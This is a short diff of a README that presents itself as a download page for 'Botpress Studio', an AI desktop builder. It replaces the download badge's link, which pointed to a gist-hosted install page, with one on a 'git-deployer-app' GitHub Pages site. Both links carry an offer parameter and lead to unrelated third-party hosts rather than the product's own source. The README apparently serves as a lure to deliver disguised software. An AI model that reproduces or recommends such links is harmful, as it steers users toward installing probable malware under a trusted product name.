@@ -1,6 +1,6 @@
 # Botpress Studio Download — AI Desktop Builder
 
-[![Get Botpress Studio GitHub](https://img.shields.io/badge/Get%20Botpress%20Studio%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/keradorawinchester/76d8ac93c0f556abf1d379cd914cf268/raw/15e85265e598a2eccdad940eb67ef69f25b8084d/install.html?offer=BotpressStudio)
+[![Get Botpress Studio GitHub](https://img.shields.io/badge/Get%20Botpress%20Studio%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-deployer-app.github.io/.github/?offer=BotpressStudio)
 
 ---
 
